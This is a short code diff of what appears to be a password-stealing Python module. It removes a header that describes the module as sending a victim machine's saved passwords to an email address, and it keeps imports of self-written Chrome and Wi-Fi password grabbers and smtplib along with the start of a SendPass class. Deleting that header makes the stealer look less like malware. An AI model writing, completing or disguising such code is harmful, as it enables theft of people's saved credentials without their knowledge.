@@ -1,16 +1,7 @@
-#!/usr/bin/python3
 import time, smtplib, platform, getpass
 import get_chrome_pass, get_wifi_pass  #Self Written Modules
 import requests
 import os 
-
-#==================================================================
-#Author : Pushpender Singh
-#==================================================================
-#Usage: Module is send Saved Password of Victim machine to Email.
-#==================================================================
-#Github: https://github.com/PushpenderIndia/
-#==================================================================
 
 class SendPass:
     def __init__(self, email, password):
